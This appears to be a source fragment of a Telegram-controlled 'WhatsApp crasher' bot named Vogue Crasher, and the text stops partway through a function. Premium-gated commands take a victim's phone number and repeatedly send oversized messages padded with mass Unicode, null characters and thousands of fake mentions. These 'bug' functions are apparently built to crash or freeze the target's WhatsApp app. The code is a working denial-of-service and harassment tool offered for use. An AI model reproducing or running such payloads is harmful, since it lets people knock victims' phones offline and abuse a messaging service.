+──────────────────────────
+
+SESSION TERMINATION
+
+Status      : Processing
+Engine      : Active
+Action      : Removing Auth Session
+
+──────────────────────────
+The system is currently deleting all active WhatsApp session data.
+</pre>`,
+        {
+            parse_mode: "HTML"
+        }
+    );
+    
+    try {
+        
+        if (sock) {
+            try {
+                await sock.logout();
+            } catch {}
+        }
+        
+        const sessionPath = "./session";
+        
+        if (fs.existsSync(sessionPath)) {
+            fs.rmSync(sessionPath, {
+                recursive: true,
+                force: true
+            });
+        }
+        
+        isWhatsAppConnected = false;
+        
+        await ctx.telegram.editMessageText(
+            ctx.chat.id,
+            msg.message_id,
+            undefined,
+            `<pre>
+V O G U E  •  S E S S I O N
+──────────────────────────
+
+SESSION TERMINATION
+
+Status      : Complete
+Engine      : Offline
+Action      : Session Destroyed
+
+──────────────────────────
+All WhatsApp session files have
+been successfully removed.
+
+Re-pairing is required before
+the sender can reconnect.
+</pre>`,
+            {
+                parse_mode: "HTML"
+            }
+        );
+        
+        console.log(
+            `[VOGUE CRASHER] Session terminated successfully`
+        );
+        
+    } catch (error) {
+        
+        await ctx.telegram.editMessageText(
+            ctx.chat.id,
+            msg.message_id,
+            undefined,
+            `<pre>
+V O G U E  •  S E S S I O N
+──────────────────────────
+
+SESSION TERMINATION
+
+Status      : Failed
+Engine      : Error
+Action      : Abort Operation
+
+──────────────────────────
+The system failed to remove
+the current session data.
+</pre>`,
+            {
+                parse_mode: "HTML"
+            }
+        );
+        
+        console.log(
+            `[VOGUE CRASHER] Session termination failed`
+        );
+        
+    }
+    
+});
+
+bot.command('info', async (ctx) => {
+    
+    const os = require('os');
+    
+    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
+    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
+    const usedRam = (totalRam - freeRam).toFixed(2);
+    
+    const uptime = process.uptime();
+    
+    const days = Math.floor(uptime / 86400);
+    const hours = Math.floor((uptime % 86400) / 3600);
+    const minutes = Math.floor((uptime % 3600) / 60);
+    const seconds = Math.floor(uptime % 60);
+    
+    const runtime =
+        `${days}d ${hours}h ${minutes}m ${seconds}s`;
+    
+    const cpuModel = os.cpus()[0].model;
+    const cpuCores = os.cpus().length;
+    
+    const platform = os.platform();
+    const hostname = os.hostname();
+    
+    const senderStatus =
+        isWhatsAppConnected ? "Connected" : "Disconnected";
+    
+    const currentTime =
+        moment()
+        .tz('Asia/Jakarta')
+        .format('DD/MM/YYYY HH:mm:ss');
+    
+    const infoMessage = `
+<pre>
+┏━ V O G U E • S Y S T E M • I N F O ━┓
+
+⌬ BOT INFORMATION
+
+› Bot Name
+  Vogue Crasher
+
+› Version
+  1.0 Pro
+  
+› Developer
+  @ScriptKits
+
+› Runtime
+  ${runtime}
+  
+› Status
+  Active and Operational
+
+────────────────────────────
+
+⌬ WHATSAPP INFORMATION
+
+› Sender Status
+  ${senderStatus}
+  
+› Connection Mode
+  Single Device
+
+────────────────────────────
+
+⌬ VPS INFORMATION
+
+› Hostname
+  ${hostname}
+› Platform
+  ${platform}
+› CPU Model
+  ${cpuModel}
+› CPU Cores
+  ${cpuCores} Cores
+› RAM Usage
+  ${usedRam} GB / ${totalRam} GB
+› Free RAM
+  ${freeRam} GB
+
+────────────────────────────
+
+⌬ SYSTEM INFORMATION
+
+› NodeJS Version
+  ${process.version}
+› Current Time
+  ${currentTime} WIB
+› Process ID
+  ${process.pid}
+
+────────────────────────────
+
+System operating normally without
+critical exception or service failure.
+
+┗━ V O G U E • C R A S H E R ━┛
+</pre>`;
+    
+    if (infoMessage.length > 1024) {
+        return ctx.reply(
+            infoMessage,
+            {
+                parse_mode: "HTML"
+            }
+        );
+    }
+    
+    ctx.replyWithPhoto(thumbnailUrl, {
+        caption: infoMessage,
+        parse_mode: "HTML",
+    });
+    
+});
+
+bot.command('pingsys', async (ctx) => {
+    
+    const start = Date.now();
+    
+    const msg = await ctx.reply(
+        `<pre>
+V O G U E  •  N E T W O R K
+──────────────────────────
+
+LATENCY SCAN
+
+Status      : Scanning
+Host        : Telegram API
+Engine      : Measuring Response
+
+──────────────────────────
+Please wait while the system
+analyzes network latency.
+</pre>`,
+        {
+            parse_mode: "HTML"
+        }
+    );
+    
+    setTimeout(async () => {
+        
+        const ping = Date.now() - start;
+        
+        await ctx.telegram.editMessageText(
+            ctx.chat.id,
+            msg.message_id,
+            undefined,
+            `<pre>
+V O G U E  •  N E T W O R K
+──────────────────────────
+
+LATENCY SCAN
+
+Status      : Complete
+Response    : ${ping} ms
+Connection  : Stable
+
+──────────────────────────
+System response time has
+been successfully analyzed.
+</pre>`,
+            {
+                parse_mode: "HTML"
+            }
+        );
+        
+    }, 2000);
+    
+});
+
+// ==========================================
+// ALL BUG COMMAND
+// ==========================================
+
+bot.command('spamandro', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Processing
+
+──────────────────────────
+</pre>`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`
+                    }]
+                ]
+            }
+        });
+        
+        // 🚀 ISOLATED WORKER (PARALLEL SAFE)
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random(); // unik per user instance
+            
+            for (let i = 0; i < 20; i++) {
+                
+                try {
+                    
+                    if (!sock) {
+                        throw new Error("Socket unavailable");
+                    }
+                    
+                    await Xvzzk(sock, target);
+                    await sleep(1000);
+                    
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    autoRestartOn408(err);
+                }
+            }
+            
+            try {
+                await ctx.telegram.editMessageCaption(
+                    ctx.chat.id,
+                    sent.message_id,
+                    undefined,
+                    `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : SUCCESS
+
+──────────────────────────
+All processes completed successfully.
+</pre>`,
+                    {
+                        parse_mode: "HTML",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: "Check Target",
+                                    url: `https://wa.me/${q}`
+                                }]
+                            ]
+                        }
+                    }
+                );
+            } catch (e) {
+                console.log(`[WORKER ${instanceId}] Final update failed`);
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })(); // 🔥 DETACHED → NON BLOCKING
+        
+        // handler langsung selesai di sini (tidak nunggu worker)
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+    }
+});
+
+bot.command('spamiphone', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamiphone <target_number>
+
+Example:
+/spamiphone 628xxxxxxxx`
+    );
+    
+    let target =
+        q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Processing
+
+──────────────────────────
+Dispatch engine is currently active.
+</pre>`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                    {
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`
+                    }]
+                ]
+            }
+        });
+        
+        setImmediate(async () => {
+            for (let i = 0; i < 100; i++) {
+                
+                try {
+                    if (!sock) {
+                        throw new Error("WhatsApp socket unavailable");
+                    }
+                    await Ipongforcloseivs(sock, target);
+                } catch (e) {
+                    console.log(
+                        `[VOGUE CRASHER] Dispatch Error: ${e.message}`
+                    );
+                    
+                }
+                
+                await sleep(1500);
+            }
+            
+            await ctx.telegram.editMessageCaption(
+                ctx.chat.id,
+                sent.message_id,
+                undefined,
+                `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Complete
+
+──────────────────────────
+Execution completed successfully.
+</pre>`,
+                {
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                            {
+                                text: "Check Target",
+                                url: `https://wa.me/${q}`
+                            }]
+                        ]
+                    }
+                }
+            );
+            
+            console.log(
+                `[VOGUE CRASHER] Execution completed successfully for ${q}`
+            );
+            
+        });
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(
+            `[VOGUE CRASHER] Execution failed for ${q}`
+        );
+    }
+});
+
+
+// ==========================================
+// 🔒 ALL FUNCTION BUG
+// ==========================================
+
+
+async function Ipongforcloseivs(sock, target) {
+    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
+    const s = "𑇂𑆵𑆴𑆿".repeat(60000);
+    try {
+        let locationMessagex = {
+            degreesLatitude: 11.11,
+            degreesLongitude: -11.11,
+            name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
+            url: "https://t.me/elyssavirellequeenn",
+        }
+        let msgx = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    locationMessagex
+                }
+            }
+        }, {});
+        let extendMsgx = {
+            extendedTextMessage: {
+                text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
+                matchedText: "helow",
+                description: "𑇂𑆵𑆴𑆿".repeat(60000),
+                title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
+                previewType: "NONE",
+                jpegThumbnail: "",
+                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
+                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
+                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
+                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
+                mediaKeyTimestamp: "1743101489",
+                thumbnailHeight: 641,
+                thumbnailWidth: 640,
+                inviteLinkGroupTypeV2: "DEFAULT"
+            }
+        }
+        let msgx2 = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    extendMsgx
+                }
+            }
+        }, {});
+        let locationMessage = {
+            degreesLatitude: -9.09999262999,
+            degreesLongitude: 199.99963118999,
+            jpegThumbnail: null,
+            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
+            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
+            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
+        }
+        let msg = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    locationMessage
+                }
+            }
+        }, {});
+        let extendMsg = {
+            extendedTextMessage: {
+                text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone,
+                matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
+                description: "𑇂𑆵𑆴𑆿".repeat(25000),
+                title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
+                previewType: "NONE",
+                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
+                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
+                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
+                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
+                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
+                mediaKeyTimestamp: "1743101489",
+                thumbnailHeight: 641,
+                thumbnailWidth: 640,
+                inviteLinkGroupTypeV2: "DEFAULT"
+            }
+        }
+        let msg2 = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    extendMsg
+                }
+            }
+        }, {});
+        let msg3 = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    locationMessage
+                }
+            }
+        }, {});
+        
+        for (let i = 0; i < 10; i++) {
+            await sock.relayMessage('status@broadcast', msg.message, {
+                messageId: msg.key.id,
+                statusJidList: [target],
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: [{
+                            tag: 'to',
+                            attrs: {
+                                jid: target
+                            },
+                            content: undefined
+                        }]
+                    }]
+                }]
+            });
+            
+            await sock.relayMessage('status@broadcast', msg2.message, {
+                messageId: msg2.key.id,
+                statusJidList: [target],
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: [{
+                            tag: 'to',
+                            attrs: {
+                                jid: target
+                            },
+                            content: undefined
+                        }]
+                    }]
+                }]
+            });
+            await sock.relayMessage('status@broadcast', msg.message, {
+                messageId: msgx.key.id,
+                statusJidList: [target],
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: [{
+                            tag: 'to',
+                            attrs: {
+                                jid: target
+                            },
+                            content: undefined
+                        }]
+                    }]
+                }]
+            });
+            await sock.relayMessage('status@broadcast', msg2.message, {
+                messageId: msgx2.key.id,
+                statusJidList: [target],
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: [{
+                            tag: 'to',
+                            attrs: {
+                                jid: target
+                            },
+                            content: undefined
+                        }]
+                    }]
+                }]
+            });
+            
+            await sock.relayMessage('status@broadcast', msg3.message, {
+                messageId: msg2.key.id,
+                statusJidList: [target],
+                additionalNodes: [{
+                    tag: 'meta',
+                    attrs: {},
+                    content: [{
+                        tag: 'mentioned_users',
+                        attrs: {},
+                        content: [{
+                            tag: 'to',
+                            attrs: {
+                                jid: target
+                            },
+                            content: undefined
+                        }]
+                    }]
+                }]
+            });
+            if (i < 9) {
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            }
+        }
+    } catch (err) {
+        console.error(err);
+    }
+};
+
+async function delayHardV1(sock, target) {
+    while (Date.now() - Date.now() < 3000000) {
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: " ",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "payment_method",
+                            paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
+                            version: 3
+                        },
+                        mentionedJid: [
+                            "13135550002@s.whatsapp.net",
+                            ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
+                        ]
+                    }
+                }
+            }
+        }, { participant: { jid: target } });
+        await new Promise((r) => setTimeout(r, 1000));
+    }
+}
+
+async function DelayHardV2(sock, target) {
+    const Stanza_Id = generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: " [ KENZY ] ",
+                        format: "EXTENTION_1"
+                    },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555020${i + 1}@s.whatsapp.net`),
+                        statusAttributionType: "SHARED_FROM_MENTION"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                    entryPointConversionSource: "galaxy_message"
+                }
+            }
+        }
+    }, {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741,
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
+    })
+    
+    await sock.relayMessage("status@broadcast", Stanza_Id.message, {
+        messageId: Stanza_Id.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+            }]
+        }]
+    })
+    
+    const Stanza_Id2 = generateWAMessageFromContent("status@broadcast", {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "Kenzy Lyubov",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                    entryPointConversionSource: "call_permission_message"
+                }
+            }
+        }
+    }, {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741,
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
+    })
+    
+    await sock.relayMessage("status@broadcast", Stanza_Id2.message, {
+        messageId: Stanza_Id2.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+            }]
+        }]
+    })
+}
+
+async function DelayHardV3(sock, target) {
+    let vnxdlymbg = await generateWAMessageFromContent(
+        target,
+        {
+            interactiveResponseMessage: {
+                contextInfo: {
+                    urlTrackingMap: {
+                        urlTrackingMapElements: Array.from({ length: 10000 }, () => ({
+                            "\0": "\u0000".repeat(250000)
+                        }))
+                    },
+                    body: {
+                        text: "VnX"
+                    },
+                    footer: {
+                        text: "\u0000".repeat(250000)
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "galaxy_message",
+                        paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(250000)}}}`,
+                        version: 3
+                    }
+                }
+            }
+        }, { userJid: sock.user.id, quoted: null }
+    );
+    
+    await sock.relayMessage(
+        "status@broadcast",
+        vnxdlymbg.message,
+        {
+            messageId: vnxdlymbg.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                {
+                    tag: "mentioned_users",
+                    attrs: {},
+                    content: [
+                    {
+                        tag: "to",
+                        attrs: { jid: target },
+                        content: undefined
+                    }]
+                }]
+            }]
+        }
+    );
+}
+
+async function HardStatusBlast(sock, target) {
+    try {
+        const payloadBeta = {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: " #-Maklu",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: " ".repeat(1045000),
+                            version: 3
+                        },
+                        entryPointConversionSource: "galaxy_message",
+                    }
+                }
+            }
+        };
+        
+        const payloadGamma = {
+            viewOnceMessage: {
+                message: {
+                    stickerMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+                        mimetype: "image/webp",
+                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+                        fileLength: { low: 1, high: 0, unsigned: true },
+                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                        firstFrameLength: 19904,
+                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
+                        isAnimated: true,
+                        contextInfo: {
+                            mentionedJid: [
+                                "0@s.whatsapp.net",
+                                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+                            ],
+                            groupMentions: [],
+                            entryPointConversionSource: "non_contact",
+                            entryPointConversionApp: "whatsapp",
+                            entryPointConversionDelaySeconds: 467593,
+                        },
+                        stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
+                        isAvatar: false,
+                        isAiSticker: false,
+                        isLottie: false,
+                    },
+                },
+            },
+        };
+        
+        for (let i = 0; i < 50; i++) {
+            await sock.sendMessage(target, payloadBeta, { statusBroadcast: true });
+            await sock.sendMessage(target, payloadGamma, { statusBroadcast: true });
+            await new Promise(r => setTimeout(r, 2500));
+        }
+        console.log("SUCCES SENDING BUG");
+    } catch (err) { console.error("Error:", err.message); }
+}
+
+async function Xvzzk(sock, target) {
+  while (true) {
+    let message = {
+      imageMessage: {
